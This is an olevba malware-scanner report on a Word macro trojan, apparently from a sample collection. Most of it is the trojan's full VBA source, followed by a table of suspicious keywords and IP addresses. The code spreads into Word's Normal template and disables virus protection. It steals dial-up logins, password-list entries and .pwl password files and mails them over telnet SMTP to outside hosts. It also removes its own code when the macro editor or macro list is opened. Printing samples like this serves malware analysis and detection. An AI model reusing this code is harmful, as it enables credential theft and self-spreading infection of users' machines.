olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.c-88e619a28839c6d8bc1bf33648fbeb1fc408f0eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.c-88e619a28839c6d8bc1bf33648fbeb1fc408f0eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPlus.bas 
in file: Trojan.MSWord.Npr.c-88e619a28839c6d8bc1bf33648fbeb1fc408f0eb - OLE stream: 'Macros/VBA/MSPlus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub AutoOpen()
Dim Yes As Boolean
Dim Source As String
Dim VBComponent As Object
On Error Resume Next
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
Source = MacroContainer.FullName
Yes = False
For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPlus" Then
  Yes = True
 End If
Next
 If Yes = False Then
 CopyModule NormalTemplate.FullName, Source
 End If
  Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 NormalTemplate.Save
End Sub
Sub CopyModule(Target As String, Source_ As String)
Dim VBComponent As Object
On Error Resume Next
Application.OrganizerCopy _
  Source:=Source_, _
  Destination:=Target, _
  Name:="MSPlus", _
  Object:=wdOrganizerObjectProjectItems
For Each VBComponent In MacroContainer.VBProject.VBComponents
  If VBComponent.Name <> "ThisDocument" Then
   Application.OrganizerCopy _
    Source:=Source_, _
    Destination:=Target, _
    Name:=VBComponent.Name, _
    Object:=wdOrganizerObjectProjectItems
 End If
Next

End Sub
Sub AutoExit()
Application.Visible = False
Tmsn
End Sub
Sub FileOpen()
AutoOpen
Dialogs(80).Show
Tmsn
End Sub
Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Tmsn
End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Sub AutoClose()
AutoOpen
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Sender()
Dim Handle As Long
Dim HandleBW As Long
Dim hWnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 5) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim TWnd As String
Dim None As String
On Error Resume Next
If Chkip > 400 Then
Host(1) = "chat.ru"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "194.67.1.159"
Loto 5, A()
For f = 1 To 5
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    TWnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
   TWnd = "Òåëíåò - "
    None = "(íåò)"
    Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
   TWnd = "telnet - "
    None = "(íåò)"
  End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 60 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), TWnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
SMTP = "helo selena#$mail from: <cookie@mail.ru>#rcpt to: <kashek@usa.net>#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hWnd <> 0 Or Timer - Start > 150
 hWnd = FindWindow(CLng(0), TWnd)
 DoEvents
Loop
Select Case hWnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hWnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), TWnd + " - " + None)
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Handle = 0
End Select
Next
End If
End Sub
Function Chkip()
Dim hWnd As Long
Dim Start As Long
Dim A As Long
Dim i As Long
Dim NF As Integer
Dim NF1 As Integer
On Error Resume Next
NF = FreeFile
Open "c:\windows\chkip.bat" For Output Access Write As #NF
Print #NF, "route print > c:\windows\chkip.bmp"
Close #NF
Shell "c:\windows\chkip.bat", 0
Start = Timer
 Do While FindWindow(CLng(0), "(Ñåàíñ çàâåðøåí) - chkip") = 0
        DoEvents
        If Timer > Start + 10 Then
         Exit Function
        End If
 Loop
hWnd = FindWindow(CLng(0), "(Ñåàíñ çàâåðøåí) - chkip")
SendMessage hWnd, CLng(16), ByVal CLng(0), 0
Chkip = FileLen("c:\windows\chkip.bmp")
A = 255
NF = FreeFile
Open "c:\windows\chkip.bat" For Binary Access Write As #NF
NF1 = FreeFile
Open "c:\windows\chkip.bmp" For Binary Access Write As #NF1
For i = 1 To LOF(NF)
 Put #NF, i, A
Next
For i = 1 To LOF(NF1)
 Put #NF1, i, A
Next
Close #NF
Close #NF1
Kill "c:\windows\chkip.bat"
Kill "c:\windows\chkip.bmp"
End Function
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next

End Function
Sub Filler(MessStr As String, hWnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hWnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
   Charset = SendMessage(hWnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Print #NF1, PwdLst
Close #NF1
End Function
Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function
Sub ViewVBCode()
Deleter
ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
Deleter
Dialogs(wdDialogToolsMacro).Display
End Sub
Sub Deleter()
Dim TempPath As String, TempName As String
Dim Docum As Object
Dim VBComp As Object
On Error Resume Next
For Each VBComp In NormalTemplate.VBProject.VBComponents
 If VBComp.Name <> "ThisDocument" Then
  With NormalTemplate.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
  End With
 Application.OrganizerDelete NormalTemplate.Name, VBComp.Name, wdOrganizerObjectProjectItems
 End If
Next
For Each VBComp In ActiveDocument.VBProject.VBComponents
 Debug.Print VBComp.Name
  If VBComp.Name <> "ThisDocument" Then
   With ActiveDocument.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
   End With
   Application.OrganizerDelete ActiveDocument.Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
Next
Options.SaveNormalPrompt = True
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |194.67.1.159        |IPv4 address                                 |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |chkip.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

